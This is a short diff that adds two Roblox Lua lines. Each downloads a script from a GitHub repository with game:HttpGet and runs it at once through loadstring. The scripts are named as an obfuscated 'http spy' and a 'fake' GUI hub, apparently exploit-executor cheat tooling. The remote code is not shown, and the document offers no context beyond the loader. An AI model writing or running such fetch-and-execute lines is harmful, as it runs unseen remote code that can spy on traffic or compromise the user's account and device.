@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/obfuscation/refs/heads/main/http%20spy%20on%20the%20phone"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lolssqa/Lu-Yan-game-/refs/heads/main/lu_hub_gui_fake"))()
